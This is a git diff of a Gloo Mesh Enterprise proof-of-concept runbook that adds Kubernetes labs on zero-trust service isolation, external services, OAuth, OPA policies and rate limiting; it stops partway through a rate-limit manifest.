@@ -10,7 +10,9 @@ source ./scripts/assert.sh
 ![Gloo Mesh Enterprise](images/gloo-mesh-enterprise.png)
 # <center>WU Gloo Mesh POC Runbook</center>
 
-## Table of Contents
+# Table of Contents
+
+## Gloo Mesh Labs
 * [Introduction to Gloo Mesh](#introduction)
 * [Lab 0 - Prerequisites](#Lab-0)
 * [Lab 1 - Setting up your Environment Variables](#Lab-1)
@@ -27,8 +29,19 @@ source ./scripts/assert.sh
 * [Lab 11 - Multi-cluster Traffic](#Lab-11)
 * [Lab 12 - Leverage Virtual Destinations](#Lab-12)
 * [Lab 13 - Service failover across clusters and Locality Configuration](#Lab-13)
-* [Lab 14 - Zero trust](#Lab-14)
-* [Lab 15 - Exploring the Gloo Mesh Enterprise UI](#Lab-15)
+* [Lab 14 - Deploy sleep containers for zero-trust lab](#Lab-14)
+* [Lab 15 - Zero trust](#Lab-15)
+* [Lab 16 - Create the httpbin workspace](#Lab-16)
+* [Lab 17 - Expose an external service](#Lab-17)
+
+## Gloo Gateway Labs
+* [Lab 1 - Securing the access with OAuth](#Lab-1-gw)
+* [Lab 2 - Integrating with OPA](#Lab-2-gw)
+* [Lab 3 - Apply rate limiting to the Gateway](#Lab-3-gw)
+* [Lab 4 - Use the Transformation filter](#Lab-4-gw)
+* [Lab 5 - Use the Web Application Firewall filter](#Lab-5-gw)
+
+
 
 ## Introduction to Gloo Mesh <a name="introduction"></a>
 
@@ -466,7 +479,7 @@ echo $ENDPOINT_HTTP_GW_CLUSTER2
 echo $ENDPOINT_HTTPS_GW_CLUSTER2
 ```
 
-## Lab 3 - Deploy the Bookinfo demo app <a name="Lab-3"></a>
+## Lab 3 - Deploy the Bookinfo demo app <a name="Lab-3-gw"></a>
 
 We're going to deploy the bookinfo application to demonstrate several features of Istio and Gloo Mesh.
 
@@ -855,6 +868,26 @@ helm upgrade --install gloo-mesh-agent gloo-mesh-agent/gloo-mesh-agent \
 
 You can check the cluster(s) have been registered correctly using the following commands:
 
+Method #1: Port-forward to gloo-mesh-mgmt-server admin page
+
+In the terminal, run the port-forward command below to expose the metrics endpoint
+```
+kubectl port-forward -n gloo-mesh --context ${MGMT} deploy/gloo-mesh-mgmt-server 9091
+```
+
+In your browser, connect to http://localhost:9091/metrics
+
+In the metrics UI, look for the following lines. If the values are 1, the agents in the workload clusters are successfully registered with the management server. If the values are 0, the agents are not successfully connected.
+```
+relay_pull_clients_connected{cluster="cluster1"} 1
+relay_pull_clients_connected{cluster="cluster2"} 1
+# HELP relay_push_clients_connected Current number of connected Relay push clients (Relay Agents).
+# TYPE relay_push_clients_connected gauge
+relay_push_clients_connected{cluster="cluster1"} 1
+relay_push_clients_connected{cluster="cluster2"} 1
+```
+
+Method #2: With Ephemeral Containers feature-flag enabled:
 ```
 pod=$(kubectl --context ${MGMT} -n gloo-mesh get pods -l app=gloo-mesh-mgmt-server -o jsonpath='{.items[0].metadata.name}')
 kubectl --context ${MGMT} -n gloo-mesh debug -q -i ${pod} --image=curlimages/curl -- curl -s http://localhost:9091/metrics | grep relay_push_clients_connected
@@ -868,6 +901,22 @@ You should get an output similar to this:
 relay_push_clients_connected{cluster="cluster1"} 1
 relay_push_clients_connected{cluster="cluster2"} 1
 ```
+
+Method #3: Visualize in the UI
+
+To open a port-forward to the Gloo Mesh UI you can either use `meshctl` or `kubectl` commands
+
+meshctl:
+```
+meshctl dashboard --kubecontext ${MGMT}
+```
+
+kubectl:
+```
+kubectl port-forward -n gloo-mesh svc/gloo-mesh-ui 8090 --context ${MGMT}
+```
+
+If agents were successfully registered, you should see information in the Clusters section of the Overview page.
 
 To use the Gloo Mesh Gateway advanced features (external authentication, rate limiting, ...), you need to install the Gloo Mesh addons.
 
@@ -2211,6 +2260,127 @@ kubectl --context ${CLUSTER1} -n bookinfo-frontends delete failoverpolicy failov
 kubectl --context ${CLUSTER1} -n bookinfo-frontends delete outlierdetectionpolicy outlier-detection
 ```
 
+## Lab 14 - Deploy sleep containers for zero-trust lab <a name="Lab-14"></a>
+If you do not have ephemeral containers feature flag turned on, we can replace the functionality with the sleep demo app
+
+Run the following commands to deploy the sleep app on `cluster1` twice
+
+The first version will be called `sleep-not-in-mesh` and won't have the sidecar injected (because we don't label the namespace).
+```bash
+kubectl --context ${CLUSTER1} create ns sleep
+
+kubectl --context ${CLUSTER1} apply -n sleep -f - <<EOF
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: sleep-not-in-mesh
+  namespace: sleep
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: sleep-not-in-mesh
+  namespace: sleep
+  labels:
+    app: sleep-not-in-mesh
+    service: sleep-not-in-mesh
+spec:
+  ports:
+  - port: 80
+    name: http
+  selector:
+    app: sleep-not-in-mesh
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: sleep-not-in-mesh
+  namespace: sleep
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: sleep-not-in-mesh
+  template:
+    metadata:
+      labels:
+        app: sleep-not-in-mesh
+    spec:
+      terminationGracePeriodSeconds: 0
+      serviceAccountName: sleep-not-in-mesh
+      containers:
+      - name: sleep
+        image: curlimages/curl
+        command: ["/bin/sleep", "3650d"]
+        imagePullPolicy: IfNotPresent
+        volumeMounts:
+        - mountPath: /etc/sleep-not-in-mesh/tls
+          name: secret-volume
+      volumes:
+      - name: secret-volume
+        secret:
+          secretName: sleep-not-in-mesh-secret
+          optional: true
+EOF
+```
+
+The second version will be called sleep-in-mesh and will have the sidecar injected (because of the label istio.io/rev in the Pod template).
+```bash
+kubectl --context ${CLUSTER1} apply -n sleep -f - <<EOF
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: sleep-in-mesh
+  namespace: sleep
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: sleep-in-mesh
+  namespace: sleep
+  labels:
+    app: sleep-in-mesh
+    service: sleep-in-mesh
+spec:
+  ports:
+  - port: 80
+    name: http
+  selector:
+    app: sleep-in-mesh
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: sleep-in-mesh
+  namespace: sleep
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: sleep-in-mesh
+  template:
+    metadata:
+      labels:
+        app: sleep-in-mesh
+        istio.io/rev: 1-13
+    spec:
+      terminationGracePeriodSeconds: 0
+      serviceAccountName: sleep-in-mesh
+      containers:
+      - name: sleep
+        image: curlimages/curl
+        command: ["/bin/sleep", "3650d"]
+        imagePullPolicy: IfNotPresent
+        volumeMounts:
+        - mountPath: /etc/sleep-in-mesh/tls
+          name: secret-volume
+      volumes:
+      - name: secret-volume
+        secret:
+          secretName: sleep-in-mesh-secret
+          optional: true
+EOF
+```
 
 
 ## Lab 14 - Zero trust <a name="Lab-14"></a>
@@ -2226,6 +2396,12 @@ Let's validate this.
 
 Run the following commands to initiate a communication from a service which isn't in the mesh to a service which is in the mesh:
 
+With Sleep App:
+```
+kubectl --context ${CLUSTER1} exec -it -n sleep deploy/sleep-not-in-mesh -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
+```
+
+With Ephemeral Containers:
 ```
 pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=not-in-mesh -o jsonpath='{.items[0].metadata.name}')
 kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
@@ -2235,6 +2411,12 @@ You should get a `200` response code which confirm that the communication is cur
 
 Run the following commands to initiate a communication from a service which is in the mesh to another service which is in the mesh:
 
+With Sleep App:
+```
+kubectl --context ${CLUSTER1} exec -it -n sleep deploy/sleep-in-mesh -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
+```
+
+With Ephemeral Containers:
 ```
 pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}')
 kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
@@ -2244,7 +2426,16 @@ You should get a `200` response code again.
 
 To enfore a zero trust policy, it shouldn't be the case.
 
-We'll leverage the Gloo Mesh workspaces to get to a state where:
+If you run the commands below, you will find that no `PeerAuthentication`, `AuthorizationPolicy`, or `Sidecars` have been configured to enforce zero trust.
+```
+kubectl get PeerAuthentication -A --context ${CLUSTER1}
+kubectl get AuthorizationPolicy -A --context ${CLUSTER1}
+kubectl get Sidecars -A --context ${CLUSTER1}
+```
+
+When running these commands you should see an output that says `No resources found`. This is expected
+
+Now we'll leverage the Gloo Mesh workspaces to get to a state where:
 
 - communications between services which are in the mesh and others which aren't in the mesh aren't allowed anymore
 - communications between services in the mesh are allowed only when services are in the same workspace or when their workspaces have import/export rules.
@@ -2284,14 +2475,100 @@ spec:
 EOF
 ```
 
-When service isolation is enabled, Gloo Mesh creates the corresponding Istio `AuthorizationPolicy` and `PeerAuthentication` objects to enforce zero trust.
+When service isolation is enabled, Gloo Mesh creates the corresponding Istio `AuthorizationPolicy` and `PeerAuthentication` objects, as well as configures the `Sidecar` objects to enforce zero trust.
 
 When `trimProxyConfig` is set to `true`, Gloo Mesh also creates the corresponding Istio `Sidecar` objects to program the sidecar proxies to only know how to talk to the authorized services.
+
+To validate this, run the commands below:
+```
+kubectl get PeerAuthentication -A --context ${CLUSTER1}
+kubectl get AuthorizationPolicy -A --context ${CLUSTER1}
+kubectl get Sidecars -A --context ${CLUSTER1}
+```
+
+To dig in deeper, you can run a `kubectl get <resource> -n <namespace> -o yaml` to see more details on what Gloo Mesh is doing under the hood
+
+For example:
+```
+kubectl get AuthorizationPolicy -n bookinfo-frontends settings-productpage-9080-bookinfo -o yaml
+```
+
+Will yield the AuthorizationPolicy that was automatically generated by Gloo Mesh when workspace isolation was turned on:
+```
+apiVersion: security.istio.io/v1beta1
+kind: AuthorizationPolicy
+metadata:
+  creationTimestamp: "2022-06-14T20:40:44Z"
+  generation: 1
+  labels:
+    agent.gloo.solo.io: gloo-mesh
+    cluster.multicluster.solo.io: ""
+    context.mesh.gloo.solo.io/cluster: cluster1
+    context.mesh.gloo.solo.io/namespace: bookinfo-frontends
+    context.mesh.gloo.solo.io/workspace: bookinfo
+    gloo.solo.io/parent_cluster: cluster1
+    gloo.solo.io/parent_group: ""
+    gloo.solo.io/parent_kind: Service
+    gloo.solo.io/parent_name: productpage
+    gloo.solo.io/parent_namespace: bookinfo-frontends
+    gloo.solo.io/parent_version: v1
+    owner.gloo.solo.io/name: gloo-mesh
+    reconciler.mesh.gloo.solo.io/name: translator
+    relay.solo.io/cluster: cluster1
+  name: settings-productpage-9080-bookinfo
+  namespace: bookinfo-frontends
+  resourceVersion: "9799"
+  uid: 23499fc1-c1fe-49b5-8a84-ca454214d99d
+spec:
+  rules:
+  - from:
+    - source:
+        principals:
+        - cluster1/ns/bookinfo-backends/sa/bookinfo-details
+        - cluster1/ns/bookinfo-backends/sa/bookinfo-ratings
+        - cluster1/ns/bookinfo-backends/sa/bookinfo-reviews
+        - cluster1/ns/bookinfo-backends/sa/default
+        - cluster1/ns/bookinfo-frontends/sa/bookinfo-productpage
+        - cluster1/ns/bookinfo-frontends/sa/default
+        - cluster2/ns/bookinfo-backends/sa/bookinfo-details
+        - cluster2/ns/bookinfo-backends/sa/bookinfo-ratings
+        - cluster2/ns/bookinfo-backends/sa/bookinfo-reviews
+        - cluster2/ns/bookinfo-backends/sa/default
+        - cluster2/ns/bookinfo-frontends/sa/bookinfo-productpage
+        - cluster2/ns/bookinfo-frontends/sa/default
+    - source:
+        principals:
+        - cluster1/ns/gloo-mesh-addons/sa/default
+        - cluster1/ns/gloo-mesh-addons/sa/ext-auth-service
+        - cluster1/ns/gloo-mesh-addons/sa/rate-limiter
+        - cluster1/ns/istio-gateways/sa/default
+        - cluster1/ns/istio-gateways/sa/istio-eastwestgateway
+        - cluster1/ns/istio-gateways/sa/istio-ingressgateway
+        - cluster2/ns/gloo-mesh-addons/sa/default
+        - cluster2/ns/gloo-mesh-addons/sa/ext-auth-service
+        - cluster2/ns/gloo-mesh-addons/sa/rate-limiter
+        - cluster2/ns/istio-gateways/sa/default
+        - cluster2/ns/istio-gateways/sa/istio-eastwestgateway
+        - cluster2/ns/istio-gateways/sa/istio-ingressgateway
+    to:
+    - operation:
+        ports:
+        - "9080"
+  selector:
+    matchLabels:
+      app: productpage
+```
 
 If you refresh the browser, you'll see that the bookinfo application is still exposed and working correctly.
 
 Run the following commands to initiate a communication from a service which isn't in the mesh to a service which is in the mesh:
 
+With Sleep App:
+```
+kubectl --context ${CLUSTER1} exec -it -n sleep deploy/sleep-not-in-mesh -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
+```
+
+With Ephemeral Containers:
 ```
 pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=not-in-mesh -o jsonpath='{.items[0].metadata.name}')
 kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
@@ -2301,6 +2578,12 @@ You should get a `000` response code which means that the communication can't be
 
 Run the following commands to initiate a communication from a service which is in the mesh to another service which is in the mesh:
 
+With Sleep App:
+```
+kubectl --context ${CLUSTER1} exec -it -n sleep deploy/sleep-in-mesh -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
+```
+
+With Ephemeral Containers:
 ```
 pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=in-mesh -o jsonpath='{.items[0].metadata.name}')
 kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
@@ -2310,17 +2593,923 @@ You should get a `403` response code which means that the sidecar proxy of the `
 
 You've achieved zero trust with nearly no effort.
 
-## Lab 15 - Exploring the Gloo Mesh Enterprise UI <a name="Lab-15"></a>
+## Lab 16 - Create the httpbin workspace <a name="Lab-16"></a>
 
-Gloo Mesh provides a powerful dashboard to view your multi-cluster Istio environment.
+We're going to create a workspace for the team in charge of the httpbin application.
 
-The Overview page presents an at-a-glance look at the health of workspaces and clusters that make up your Gloo Mesh setup. In the Workspaces and Clusters panes, you can review a count of the healthy resources, sort by, or search by name for your resources. You can review top-level details about each resource in the resource cards. The Gloo Mesh UI includes a Graph page to visualize the network traffic in your apps across meshes and clusters. The graph is based off Prometheus metrics that the agents on each workload cluster send the management cluster.
+The platform team needs to create the corresponding `Workspace` Kubernetes objects in the Gloo Mesh management cluster.
 
-To access the UI, run the following command:
+Let's create the `httpbin` workspace which corresponds to the `httpbin` namespace on `cluster1`:
+
+```bash
+kubectl apply --context ${MGMT} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: Workspace
+metadata:
+  name: httpbin
+  namespace: gloo-mesh
+  labels:
+    allow_ingress: "true"
+spec:
+  workloadClusters:
+  - name: cluster1
+    namespaces:
+    - name: httpbin
+EOF
 ```
-kubectl port-forward -n gloo-mesh svc/gloo-mesh-ui 8090 --context ${MGMT}
+
+Then, the Httpbin team creates a `WorkspaceSettings` Kubernetes object in one of the namespaces of the `httpbin` workspace:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f- <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: WorkspaceSettings
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  importFrom:
+  - workspaces:
+    - name: gateways
+    resources:
+    - kind: SERVICE
+  exportTo:
+  - workspaces:
+    - name: gateways
+    resources:
+    - kind: SERVICE
+      labels:
+        app: in-mesh
+    - kind: ALL
+      labels:
+        expose: "true"
+EOF
 ```
 
-The UI is available at http://localhost:8090
+The Httpbin team has decided to export the following to the `gateway` workspace (using a reference):
+- the `in-mesh` Kubernetes service
+- all the resources (RouteTables, VirtualDestination, ...) that have the label `expose` set to `true`
 
-![Gloo Mesh Dashboard](images/gm-dashboard.png)
+
+
+## Lab 17 - Expose an external service <a name="Lab-17"></a>
+
+In this step, we're going to expose an external service through a Gateway using Gloo Mesh and show how we can then migrate this service to the Mesh.
+
+Let's create an `ExternalService` corresponding to `httpbin.org`:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: ExternalService
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+  - httpbin.org
+  ports:
+  - name: http
+    number: 80
+    protocol: HTTP
+  - name: https
+    number: 443
+    protocol: HTTPS
+    clientsideTls: {}
+EOF
+```
+
+Now, you can create a `RouteTable` to expose `httpbin.org` through the gateway:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      matchers:
+      - uri:
+          exact: /get
+      forwardTo:
+        destinations:
+        - kind: EXTERNAL_SERVICE
+          port:
+            number: 443
+          ref:
+            name: httpbin
+            namespace: httpbin
+EOF
+```
+
+You should now be able to access `httpbin.org` external service through the gateway.
+
+Get the URL to access the `httpbin` service using the following command:
+```
+echo "https://${ENDPOINT_HTTPS_GW_CLUSTER1}/get"
+```
+
+Let's update the `RouteTable` to direct 50% of the traffic to the local `httpbin` service:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      matchers:
+      - uri:
+          exact: /get
+      forwardTo:
+        destinations:
+        - kind: EXTERNAL_SERVICE
+          port:
+            number: 443
+          ref:
+            name: httpbin
+            namespace: httpbin
+          weight: 50
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+          weight: 50
+EOF
+```
+
+If you refresh your browser, you should see that you get a response either from the local service or from the external service.
+
+When the response comes from the external service (httpbin.org), there's a `X-Amzn-Trace-Id` header.
+
+And when the response comes from the local service, there's a `X-B3-Parentspanid` header.
+
+Finally, you can update the `RouteTable` to direct all the traffic to the local `httpbin` service:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      matchers:
+      - uri:
+          exact: /get
+      forwardTo:
+        destinations:
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+EOF
+```
+
+If you refresh your browser, you should see that you get responses only from the local service.
+
+This diagram shows the flow of the requests :
+
+![Gloo Mesh Gateway External Service](images/steps/gateway-external-service/gloo-mesh-gateway-external-service.svg)
+
+
+# Gloo Gateway Labs
+
+## Lab 1 - Securing the access with OAuth <a name="Lab-1-gw"></a>
+In this step, we're going to secure the access to the `httpbin` service using OAuth. Integrating an app with extauth consists of a few steps:
+```
+- create app registration in your OIDC
+- configuring a Gloo Mesh `ExtAuthPolicy` and `ExtAuthServer`
+- configuring the `RouteTable` with a specified label (i.e. `oauth: "true"`)
+```
+
+### In your OIDC Provider
+Once the app has been configured in the external OIDC, we need to create a Kubernetes Secret that contains the OIDC client-secret. Please provide this value input before running the command below:
+```bash
+export HTTPBIN_CLIENT_SECRET="<provide OIDC client secret here>"
+```
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: v1
+kind: Secret
+metadata:
+  name: oauth
+  namespace: httpbin
+type: extauth.solo.io/oauth
+data:
+  client-secret: $(echo -n ${HTTPBIN_CLIENT_SECRET} | base64)
+EOF
+```
+
+Set the callback URL in your OIDC provider to map to our httpbin app
+```bash
+export ENDPOINT_HTTPS_GW_CLUSTER1=$(kubectl --context ${CLUSTER1} get nodes -o jsonpath='{.items[0].status.addresses[?(.type=="InternalIP")].address}'):$(kubectl --context ${CLUSTER1} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.spec.ports[?(@.port==443)].nodePort}')
+
+echo $ENDPOINT_HTTPS_GW_CLUSTER1
+```
+
+Lastly, replace the `OICD_CLIENT_ID` and `ISSUER_URL` values below with your OIDC app settings:
+```bash
+export OIDC_CLIENT_ID="<client ID for httpbin app>"
+export ISSUER_URL="<OIDC issuer url (i.e. https://dev-22651234.okta.com/oauth2/default)>"
+```
+
+Let's make sure our variables are set correctly:
+```bash
+echo $OIDC_CLIENT_ID
+echo $ISSUER_URL
+```
+
+
+Then, you need to create an `ExtAuthPolicy`, which is a CRD that contains authentication information: 
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: security.policy.gloo.solo.io/v2
+kind: ExtAuthPolicy
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        oauth: "true"
+  config:
+    server:
+      name: ext-auth-server
+      namespace: httpbin
+      cluster: cluster1
+    glooAuth:
+      configs:
+      - oauth2:
+          oidcAuthorizationCode:
+            appUrl: https://${ENDPOINT_HTTPS_GW_CLUSTER1}
+            callbackPath: /callback
+            clientId: ${OIDC_CLIENT_ID}
+            clientSecretRef:
+              name: oauth
+              namespace: httpbin
+            issuerUrl: "${ISSUER_URL}"
+            session:
+              failOnFetchFailure: true
+              redis:
+                cookieName: httpbin-session
+                options:
+                  host: redis:6379
+            scopes:
+            - email
+            headers:
+              idTokenHeader: jwt
+EOF
+```
+
+After that, you need to create an `ExtAuthServer`, which is a CRD that define which extauth server to use: 
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: ExtAuthServer
+metadata:
+  name: ext-auth-server
+  namespace: httpbin
+spec:
+  destinationServer:
+    ref:
+      cluster: cluster1
+      name: ext-auth-service
+      namespace: gloo-mesh-addons
+    port:
+      name: grpc
+EOF
+```
+
+Finally, you need to update the `RouteTable` to use this `AuthConfig`:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      labels:
+        oauth: "true"
+      matchers:
+      - uri:
+          exact: /get
+      - uri:
+          prefix: /anything
+      - uri:
+          prefix: /callback
+      forwardTo:
+        destinations:
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+EOF
+```
+
+If you refresh the web browser, you will be redirected to the authentication page.
+
+If you use the username `user1` and the password `password` you should be redirected back to the `httpbin` application.
+
+## Lab 2 - Integrating with OPA <a name="Lab-2-gw"></a>
+
+### OPA inputs
+You can also perform authorization using OPA. Gloo Mesh's OPA integration populates an input document to use in your OPA policies which allows you to easily write rego policy
+- `input.check_request` - By default, all OPA policies will contain an Envoy Auth Service CheckRequest. This object contains all the information Envoy has gathered of the request being processed. See the Envoy docs and proto files for AttributeContext for the structure of this object.
+- `input.http_request` - When processing an HTTP request, this field will be populated for convenience. See the Envoy HttpRequest docs and proto files for the structure of this object.
+- `input.state.jwt` - When the OIDC auth plugin is utilized, the token retrieved during the OIDC flow is placed into this field. 
+
+## Lab
+In this lab, we will make use of the `input.state.jwt` parameter in our OPA policies to decode the `jwt` token retrieved in the last lab and create policies using the claims available, namely the `sub` and `email` claims.
+
+### Enforce @solo.io username login by inspecting the JWT email payload
+For our first use-case we will decode the JWT token passed through extauth for the `email` payload, and enforce that a user logging in must end with `@solo.io` as the username with OPA
+
+First, you need to create a `ConfigMap` with the policy written in rego. 
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: httpbin-opa
+  namespace: httpbin
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.state.jwt)
+        endswith(payload["email"], "@gmail.com")
+    }
+EOF
+```
+
+Then, you need to update the `ExtAuthPolicy` object to add the authorization step:
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: security.policy.gloo.solo.io/v2
+kind: ExtAuthPolicy
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        oauth: "true"
+  config:
+    server:
+      name: ext-auth-server
+      namespace: httpbin
+      cluster: cluster1
+    glooAuth:
+      configs:
+      - oauth2:
+          oidcAuthorizationCode:
+            appUrl: https://${ENDPOINT_HTTPS_GW_CLUSTER1}
+            callbackPath: /callback
+            clientId: ${OIDC_CLIENT_ID}
+            clientSecretRef:
+              name: oauth
+              namespace: httpbin
+            issuerUrl: "${ISSUER_URL}"
+            session:
+              failOnFetchFailure: true
+              redis:
+                cookieName: httpbin-session
+                options:
+                  host: redis:6379
+            scopes:
+            - email
+            headers:
+              idTokenHeader: jwt
+      - opaAuth:
+          modules:
+          - name: httpbin-opa
+            namespace: httpbin
+          query: "data.test.allow == true"
+EOF
+```
+Now we should see success when logging in with a username that ends with `@gmail.com`
+
+
+### Use OPA to enforce a specific HTTP method
+Let's continue to expand on our example by enforcing different HTTP methods for our two types of users
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: httpbin-opa
+  namespace: httpbin
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.state.jwt)
+        endswith(payload["email"], "@gmail.com")
+        any({input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+EOF
+```
+
+If you refresh the browser where the `@gmail.com` user is logged in, we should now see a `403 Error - You don't have authorization to view this page`. This is because we are not allowing the `GET` method for either of those matches in our OPA policy
+
+Let's fix that
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: httpbin-opa
+  namespace: httpbin
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.state.jwt)
+        endswith(payload["email"], "@gmail.com")
+        any({input.http_request.method == "GET",
+             input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+EOF
+```
+
+Now we should be able to access our app again.
+
+### Enforce paths with OPA
+Let's continue to expand on our example by enforcing a specified path for our users
+
+Here we will modify our rego rule so that users with `@solo.io` can access the `/get` endpoint as well as any path with the prefix `/anything`, while users with `@gmail.com` can only access specifically the `/anything/protected` endpoint
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: httpbin-opa
+  namespace: httpbin
+data:
+  policy.rego: |-
+    package test
+
+    default allow = false
+
+    allow {
+        [header, payload, signature] = io.jwt.decode(input.state.jwt)
+        endswith(payload["email"], "@gmail.com")
+        any({input.http_request.path == "/get",
+        startswith(input.http_request.path, "/anything")
+    })
+        any({input.http_request.method == "GET",
+             input.http_request.method == "POST",
+             input.http_request.method == "PUT",
+             input.http_request.method == "DELETE",
+    })
+    }
+EOF
+```
+If you refresh the browser where the `@solo.io` user is logged in, we should be able to access the `/get` endpoint as well as any path with the prefix `/anything`. Try and access `/anything/foo` for example - it should work.
+
+## Lab 3 - Apply rate limiting to the Gateway <a name="Lab-3"></a>
+In this step, we're going to apply rate limiting to the Gateway to only allow 3 requests per minute for the users of the `solo.io` organization.
+
+First, we need to create a `RateLimitClientConfig` object to define the descriptors:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: RateLimitClientConfig
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  raw:
+    rateLimits:
+    - actions:
+      - genericKey:
+          descriptorValue: "per-minute"
+      - remoteAddress: {}
+EOF
+```
+
+Then, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: RateLimitServerConfig
+metadata:
+  name: httpbin
+  namespace: gloo-mesh-addons
+spec:
+  destinationServers:
+  - ref:
+      cluster: cluster1
+      name: rate-limiter
+      namespace: gloo-mesh-addons
+    port:
+      name: grpc
+  raw:
+    descriptors:
+      - key: generic_key
+        value: "per-minute"
+        descriptors:
+          - key: remote_address
+            rateLimit:
+              requestsPerUnit: 5
+              unit: MINUTE
+EOF
+```
+
+After that, we need to create a `RateLimitPolicy` object to define the descriptors:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: RateLimitPolicy
+metadata:
